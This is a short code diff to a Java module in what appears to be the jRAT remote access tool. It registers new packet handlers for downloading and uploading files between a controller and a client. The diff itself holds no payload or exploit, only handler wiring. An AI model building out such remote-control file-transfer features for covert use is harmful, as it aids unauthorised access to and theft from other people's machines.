@@ -1,9 +1,12 @@
 package jrat.module.fs;
 
 import jrat.api.ClientModule;
-import jrat.client.packets.incoming.IncomingPacket;
 import jrat.client.packets.incoming.IncomingPackets;
 import jrat.module.fs.packets.*;
+import jrat.module.fs.packets.download.Packet102DownloadState;
+import jrat.module.fs.packets.download.Packet104DownloadPart;
+import jrat.module.fs.packets.download.Packet42Download;
+import jrat.module.fs.packets.upload.Packet21Upload;
 
 public class FileSystemClientModule extends ClientModule {
 
@@ -18,6 +21,9 @@ public class FileSystemClientModule extends ClientModule {
         IncomingPackets.register((short) 62, Packet62PreviewImage.class);
         IncomingPackets.register((short) 63, Packet63PreviewArchive.class);
         IncomingPackets.register((short) 41, Packet41SpecialDirectory.class);
-        IncomingPackets.register((short) 102, Packet102ClientDownload.class);
+        IncomingPackets.register((short) 102, Packet102DownloadState.class);
+        IncomingPackets.register((short) 42, Packet42Download.class);
+        IncomingPackets.register((short) 104, Packet104DownloadPart.class);
+        IncomingPackets.register((short) 21, Packet21Upload.class);
     }
 }
